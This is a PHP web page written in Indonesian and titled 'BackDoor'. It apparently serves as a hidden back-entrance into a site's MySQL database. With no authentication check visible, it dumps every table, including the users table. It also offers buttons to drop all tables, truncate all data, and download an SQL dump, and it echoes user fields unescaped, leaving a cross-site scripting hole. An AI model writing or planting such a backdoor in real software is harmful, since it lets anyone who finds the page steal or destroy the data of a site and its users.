<?php
include '../../conn/koneksi.php';  // Pastikan koneksi ke database sudah benar

// Fungsi untuk menghapus semua tabel
function dropAllTables($koneksi) {
    $result = mysqli_query($koneksi, "SHOW TABLES");
    while ($row = mysqli_fetch_row($result)) {
        $table = $row[0];
        $dropQuery = "DROP TABLE IF EXISTS `$table`";
        mysqli_query($koneksi, $dropQuery);
    }
}

// Fungsi untuk menghapus semua data dari setiap tabel
function truncateAllTables($koneksi) {
    $result = mysqli_query($koneksi, "SHOW TABLES");
    while ($row = mysqli_fetch_row($result)) {
        $table = $row[0];
        $truncateQuery = "TRUNCATE TABLE `$table`";
        mysqli_query($koneksi, $truncateQuery);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['drop_all'])) {
        dropAllTables($koneksi);
        header("Location: " . $_SERVER['PHP_SELF'] . "?action=dropped");
        exit;
    }

    if (isset($_POST['truncate_all'])) {
        truncateAllTables($koneksi);
        header("Location: " . $_SERVER['PHP_SELF'] . "?action=truncated");
        exit;
    }
}

$result = mysqli_query($koneksi, "SHOW TABLES");

if (isset($_GET['action'])) {
    if ($_GET['action'] === 'dropped') {
        echo "<p>Semua tabel telah dihapus!</p>";
    } elseif ($_GET['action'] === 'truncated') {
        echo "<p>Semua data dalam tabel telah dihapus!</p>";
    }
}

echo "<h1>Haloo admin super</h1>";

while ($row = mysqli_fetch_row($result)) {
    $table = $row[0];
    echo "<h2>Data Tabel: $table</h2>";
    
    if ($table === 'users') {
        echo "<table border='1'>";
        echo "<tr><th>ID</th><th>Nama Lengkap</th><th>Username</th><th>Level</th><th>Aksi</th></tr>";
        $query = "SELECT * FROM `users`";
        $dataResult = mysqli_query($koneksi, $query);

        if (mysqli_num_rows($dataResult) > 0) {
            while ($data = mysqli_fetch_assoc($dataResult)) {
                echo "<tr>";
                echo "<td>" . $data['id'] . "</td>";
                echo "<td>" . $data['nama_lengkap'] . "</td>";
                echo "<td>" . $data['username'] . "</td>";
                echo "<td>" . $data['level'] . "</td>";
                echo "<td>
                        <a href='edit_user.php?id=" . $data['id'] . "'>Edit</a> | 
                        <a href='hapus_user.php?id=" . $data['id'] . "' onclick='return confirm(\"Apakah Anda yakin ingin menghapus user ini?\");'>Hapus</a>
                      </td>";
                echo "</tr>";
            }
            echo "</table><br>";
        } else {
            echo "<p>Tabel 'users' kosong.</p><br>";
        }
    } else {
        $query = "SELECT * FROM `$table`";
        $dataResult = mysqli_query($koneksi, $query);

        if (mysqli_num_rows($dataResult) > 0) {
            echo "<table border='1'>";
            echo "<tr>";

            $fields = mysqli_fetch_fields($dataResult);
            foreach ($fields as $field) {
                echo "<th>" . $field->name . "</th>";
            }

            echo "</tr>";

            while ($data = mysqli_fetch_assoc($dataResult)) {
                echo "<tr>";
                foreach ($data as $value) {
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "</tr>";
            }

            echo "</table><br>";
        } else {
            echo "<p>Tabel $table kosong.</p><br>";
        }
    }
}
?>

<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BackDoor</title>
</head>

<body>
    <form method="post">
        <button type="submit" name="drop_all"
            onclick="return confirm('Apakah Anda yakin ingin menghapus semua tabel?');">
            Hapus Semua Tabel
        </button>
    </form>

    <form method="post">
        <button type="submit" name="truncate_all"
            onclick="return confirm('Apakah Anda yakin ingin menghapus semua data dalam tabel?');">
            Hapus Semua Data
        </button>
    </form>

    <!-- Tombol download SQL -->
    <form action="download_sql.php" method="post">
        <button type="submit" name="download_sql">
            Download SQL
        </button>
    </form>

    <a href="logout.php">Logout</a>
</body>

</html>